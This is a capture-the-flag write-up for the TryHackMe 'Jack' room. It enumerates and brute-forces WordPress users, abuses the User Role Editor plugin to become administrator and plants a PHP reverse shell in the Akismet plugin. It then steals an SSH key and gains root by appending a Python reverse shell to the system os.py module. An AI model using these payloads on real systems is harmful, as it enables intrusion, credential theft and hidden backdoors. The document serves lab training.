# [Jack](https://tryhackme.com/room/jack)

## Compromise a web server running Wordpress, obtain a low privileged user and escalate your privileges to root using a Python module.

# Deploy & Root

## Connect to our network and deploy this machine. Add jack.thm to /etc/hosts

### Gain initial access and obtain the user flag.

_Wpscan user enumeration, and don't use tools (ure_other_roles)_

1. Add the target domain to `/etc/hosts` file

[SCREEN01]

2. Enumerate WordPress users with `WPScan`
   - Found users are **jack**, **danny**, **wendy**

```bash
wpscan --url http://jack.thm --enumerate u
```

[SCREEN02]

3. Crack the password
   - Wendy password is: **changelater**

```bash
wpscan --url http://jack.thm --passwords /root/Tools/wordlists/rockyou.txt --usernames jack,danny,wendy
```

[SCREEN03]

4. Wendy has limited privileges. Enumerate WordPress plugins to find potential vulnerabilities
   - The site uses **User Role Editor (version 4.24)**, which allows modification of user roles and capabilities

```bash
wpscan --url http://jack.thm --enumerate p --plugins-detection aggressive
```

[SCREEN04]

5. Capture POST request to update profile at `http://jack.thm/wp-admin/profile.php` and add `&ure_other_roles=administrator` at the end

[SCREEN05]

6. Now with administrative access go to the `http://jack.thm/wp-admin/plugin-editor.php` and add the [reverse shell payload](https://github.com/mosec0/Reverse-Shell/blob/main/reverse-shell.php) at the beggining of the script

```php
<?php
// Set Your IP and Port
$ip = '127.0.0.1';
$port = 4444;

// Open Connection on Your Machine
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

[SCREEN06]

7.On your attack machine, set up a listener to catch the reverse shell

```bash
nc -lvnp 4444
```

7. Activate the modified Akismet plugin by navigating to `http://jack.thm/wp-admin/plugins.php` and clicking "Activate" under Akismet

8. Get the user flag

```bash
cat /home/jack/user.txt
```

[SCREEN07]

---

### Escalate your privileges to root. Whats the root flag?

_Python_

1. Upgrade to a more stable shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

2. Read the `reminder.txt`

```bash
cat /home/jack/reminder.txt
```

[SCREEN08]

3. Check the backups directory `/var/backups` and get the `id_rsa`. Save it on our attack machine and use it to login as jack

```bash
ls -la /var/backups
cat /var/backups/id_rsa
```

```bash
chmod 600 id_rsa
ssh -i id_rsa jack@10.10.144.140
```

4. Search for custom Python scripts that might be running with elevated privileges
   - There is `/opt/statuscheck/checker.py` which imports `os.py`

```bash
find / -name "*.py" -not -path "/usr/lib/*" -not -path "/etc/python*" 2>/dev/null

cat /opt/statuscheck/checker.py

locate os.py
```

[SCREEN09]

5. Start new listener on attack machine and add payload at the end of `os.py` file

```bash
nc -lvnp 5555
```

```bash
nano /usr/lib/python2.7/os.py
```

```python
import socket
import pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.63.179",5555))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

[SCREEN10]

6. Wait for shell and get the `root.txt` flag

```bash
cat /root/root.txt
```

[SCREEN11]
